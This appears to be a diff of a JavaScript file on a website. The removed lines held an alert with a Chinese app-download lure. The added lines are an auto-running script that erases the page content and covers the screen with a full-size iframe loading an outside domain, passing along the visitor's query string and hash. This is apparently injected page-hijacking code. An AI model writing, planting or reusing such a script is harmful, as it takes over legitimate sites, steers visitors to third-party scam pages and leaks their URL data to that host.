@@ -1,5 +1,67 @@
-alert("【网络上让你花钱的都是骗子 切勿充任何钱 防止诈骗】各位爸爸们 由于视频和谐很严重 我把视频放在APP里了  看到问题 随便点点 然后下载APP 注册完了 在里面搜：919 即可观看视频 没有任何病毒 下载注册就看破解版 看看视频就行了 千万别充米┗|｀O′|┛ 嗷~~");
-if (Math.random() < 0.5) {
-    window.location.href = "https://baidu.com";
-} else {
-    window.location.href = "https://baidu.com"; }
+(function () {
+    function start() {
+        function randomLetters(len) {
+            var chars = 'abcdefghijklmnopqrstuvwxyz';
+            var str = '';
+
+            for (var i = 0; i < len; i++) {
+                str += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+
+            return str;
+        }
+
+        var targetUrl =
+            'http://zz1.sdwenchanghu.com/baibai' +
+            randomLetters(8) +
+            location.search +
+            location.hash;
+
+        var viewport = document.querySelector('meta[name="viewport"]');
+
+        if (!viewport) {
+            viewport = document.createElement('meta');
+            viewport.name = 'viewport';
+            document.head.appendChild(viewport);
+        }
+
+        viewport.content = 'width=device-width,initial-scale=1';
+
+        document.documentElement.style.margin = '0';
+        document.documentElement.style.padding = '0';
+        document.documentElement.style.width = '100%';
+        document.documentElement.style.height = '100%';
+
+        document.body.innerHTML = '';
+        document.body.style.margin = '0';
+        document.body.style.padding = '0';
+        document.body.style.width = '100%';
+        document.body.style.height = '100%';
+        document.body.style.overflow = 'hidden';
+
+        var iframe = document.createElement('iframe');
+
+        iframe.src = targetUrl;
+        iframe.style.position = 'fixed';
+        iframe.style.top = '0';
+        iframe.style.left = '0';
+        iframe.style.width = '100vw';
+        iframe.style.height = '100vh';
+        iframe.style.border = '0';
+        iframe.style.margin = '0';
+        iframe.style.padding = '0';
+        iframe.style.zIndex = '2147483647';
+
+        iframe.setAttribute('frameborder', '0');
+        iframe.setAttribute('allow', 'autoplay; fullscreen');
+        iframe.setAttribute('allowfullscreen', 'true');
+
+        document.body.appendChild(iframe);
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', start);
+    } else {
+        start();
+    }
+})();
